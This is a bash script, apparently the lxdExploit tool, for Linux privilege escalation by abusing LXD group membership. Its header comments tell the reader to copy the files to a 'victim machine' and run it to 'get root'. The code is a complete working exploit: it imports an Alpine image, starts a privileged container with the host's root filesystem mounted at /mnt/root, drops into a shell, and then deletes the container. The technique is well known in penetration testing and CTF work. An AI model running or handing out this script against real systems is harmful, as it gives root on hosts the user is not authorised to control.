#!/usr/bin/env bash

# ----------------------------------
# Authors: Marcelo Vazquez (S4vitar)
#	   Victor Lasa      (vowkin)
#          Alvaro Fernandez (da3m0n)
# ----------------------------------

# Step 1: Download repository => git clone https://github.com/da3m0nsec/lxdExploit [Attacker Machine]
# Step 2: Transfer all files to the victim machine
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine

export PATH=$PATH:/snap/bin

function helpPanel(){
  echo -e "\nUsage: ./lxdExploit -i lxd.tar.xz -f rootfs.squashfs"
  echo -e "\t[-i] Image (.tar.xz alpine file)"
  echo -e "\t[-f] Filesystem (.squashfs file)"
  echo -e "\t[-h] Show this help panel\n"
  exit 1
}

function createContainer(){
  lxc image import $imagefile $fsfile --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" && lxc image list
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}

function cleanup(){
  echo -en "\n[*] Removing container..."
  lxc stop privesc && lxc delete privesc && lxc image delete alpine
  echo " [âˆš]"
}

set -o errexit

while getopts ":f:i:h" arg; do
  case "${arg}" in
    i) imagefile=$OPTARG;;
    f) fsfile=$OPTARG;;
    h) helpPanel;;
    *) helpPanel;;
  esac
done

if [ -z $imagefile ] || [ -z $fsfile ]; then
  helpPanel
else
  createContainer
fi
